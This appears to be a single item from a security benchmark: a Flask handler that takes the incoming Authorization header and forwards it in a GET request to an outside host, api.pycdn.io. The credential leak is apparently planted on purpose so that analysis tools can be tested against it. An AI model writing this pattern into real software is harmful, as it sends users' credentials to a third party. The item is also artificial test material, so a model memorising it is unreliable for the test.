# SPDX-License-Identifier: Apache-2.0
import requests
from flask import request, jsonify


def BenchmarkTest35864():
    auth_header = request.headers.get('Authorization', '')
    data = ' '.join(str(auth_header).split())
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=True)
    return jsonify({"result": "success"})
